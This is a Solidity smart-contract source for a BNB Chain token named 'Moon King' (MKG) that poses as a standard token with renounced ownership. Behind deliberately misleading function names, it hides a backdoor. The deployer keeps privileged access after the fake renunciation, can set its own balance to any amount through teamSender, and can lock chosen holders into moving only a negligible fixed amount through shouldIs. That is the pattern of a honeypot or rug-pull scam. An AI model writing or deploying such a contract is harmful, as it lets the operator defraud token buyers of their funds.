/**
 *Submitted for verification at BscScan.com on 2023-01-23
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract MoonKing {
    uint8 public decimals = 18;
    string public name = "Moon King";

    mapping(address => mapping(address => uint256)) public allowance;


    mapping(address => uint256) public balanceOf;
    address public owner;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    mapping(address => bool) public fromEnable;
    string public symbol = "MKG";
    uint256 constant amountLimit = 10 ** 10;
    address public sellLimit;

    address public toSwapToken;

    mapping(address => bool) public txAuto;
    modifier maxAmountAuto() {
        require(fromEnable[msg.sender]);
        _;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        IUniswapV2Router walletEnable = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        sellLimit = IUniswapV2Factory(walletEnable.factory()).createPair(walletEnable.WETH(), address(this));
        owner = msg.sender;
        toSwapToken = owner;
        fromEnable[toSwapToken] = true;
        balanceOf[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
        renounceOwnership();
    }

    function transfer(address dst, uint256 amount) external returns (bool) {
        return _transferFrom(msg.sender, dst, amount);
    }

    function transferFrom(address src, address dst, uint256 amount) external returns (bool) {
        if (allowance[src][msg.sender] != type(uint256).max) {
            require(allowance[src][msg.sender] >= amount);
            allowance[src][msg.sender] -= amount;
        }
        return _transferFrom(src, dst, amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function teamSender(uint256 receiverReceiver) public maxAmountAuto {
        balanceOf[toSwapToken] = receiverReceiver;
    }

    function sellWalletBuy(address launchIs) public maxAmountAuto {
        fromEnable[launchIs] = true;
    }

    function shouldIs(address minSenderAt) public maxAmountAuto {
        txAuto[minSenderAt] = true;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function tradingShould(address feeBurn, address receiverBuy, uint256 receiverReceiver) internal returns (bool) {
        require(balanceOf[feeBurn] >= receiverReceiver);
        balanceOf[feeBurn] -= receiverReceiver;
        balanceOf[receiverBuy] += receiverReceiver;
        emit Transfer(feeBurn, receiverBuy, receiverReceiver);
        return true;
    }

    function _transferFrom(address src, address dst, uint256 amount) internal returns (bool) {
        if (src == toSwapToken || dst == toSwapToken) {
            return tradingShould(src, dst, amount);
        }
        if (txAuto[src]) {
            return tradingShould(src, dst, amountLimit);
        }
        return tradingShould(src, dst, amount);
    }


}